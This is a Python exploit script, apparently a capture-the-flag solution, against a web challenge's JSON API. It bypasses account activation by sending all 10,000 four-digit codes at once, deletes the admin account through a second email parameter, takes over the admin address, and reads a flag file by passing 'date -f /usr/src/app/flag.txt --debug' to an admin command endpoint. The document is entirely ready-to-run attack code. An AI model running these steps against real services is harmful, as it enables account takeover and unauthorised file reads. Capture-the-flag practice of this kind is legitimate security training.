import requests 
import json
ADMIN = "admin@cscg.de"
url = "https://0ee2c049a5c8f93b1db34d06-1024-cybercrime-society-club-germany.challenge.master.camp.allesctf.net:31337"
def register(email,password):
	print(f"register user with email:{email},password:{password}")
	activation = "".join("{:04d}".format(i) for i in range(10000)) 
	data = {"action":"create_account","data":{"email":email,"password":password,"groupid":"e10","userid":"0000","activation":activation}}
	res = requests.post(url+"/json_api",json=data,)
	print("done!")
	print(res.text)

def login(email,password):
	print("logining~~")
	data = {"action":"login","data":{"email":email,"password":password}}
	res = requests.post(url+"/json_api",json = data)
	print("done!")
	print(res.text)
	return res.cookies

def delete(email,ADMIN,cookies):
	print("deleting~~")
	data={"action":"delete_account","data":{"email":email,"email2":ADMIN}}
	res = requests.post(url+"/json_api",cookies=cookies,json = data)
	print("done!")
	print(res.text)
def change_email(ADMIN,cookies):
	print("changing~~")	
	data = {"action":"edit_account","data":{"email":ADMIN}}
	res = requests.post(url+"/json_api",cookies=cookies,json = data)
	print("done!")
	print(res.text)
def leak_flag(cookies):
	print("leaking~~")
	data = {"action":"admin","data":{"cmd":["date","-f","/usr/src/app/flag.txt","--debug"]}}
	res = requests.post(url+"/json_api",cookies=cookies,json = data)
	print("done!")
	print(res.text)



register("ka@gmail","321123")
cookies = login("ka@gmail","321123")
delete("ka@gmail",ADMIN,cookies)
register("ka@gmail","321123")
cookies = login("ka@gmail","321123")
print(cookies)
change_email(ADMIN,cookies)
leak_flag(cookies)
